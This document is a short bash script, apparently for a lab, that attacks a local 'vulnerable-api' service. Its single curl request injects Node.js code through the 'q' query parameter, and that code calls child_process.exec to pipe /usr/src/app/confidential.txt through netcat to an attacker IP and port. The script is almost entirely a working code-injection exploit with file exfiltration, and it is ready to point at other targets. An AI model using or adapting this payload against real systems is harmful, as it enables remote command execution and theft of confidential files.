#!/bin/bash

# CLI colors
RESET="\033[0m"
RED="\033[31m"
GREEN="\033[32m"
CYAN="\033[36m"

BASE_URL="http://127.0.0.1:9000/vulnerable-api"

ATTACKER_IP="172.17.0.1"
ATTACKER_PORT="9090"

CONFIDENTIAL_FILE="/usr/src/app/confidential.txt"

echo -e "${CYAN}info${RESET}: vulnerable app url ( ${GREEN}${BASE_URL}${RESET} )"
echo -e "${CYAN}info${RESET}: sending payload ...\n"

curl "${BASE_URL}/?q=require(%27child_process%27).exec(%27cat+${CONFIDENTIAL_FILE}+|+nc+${ATTACKER_IP}+${ATTACKER_PORT}%27)"
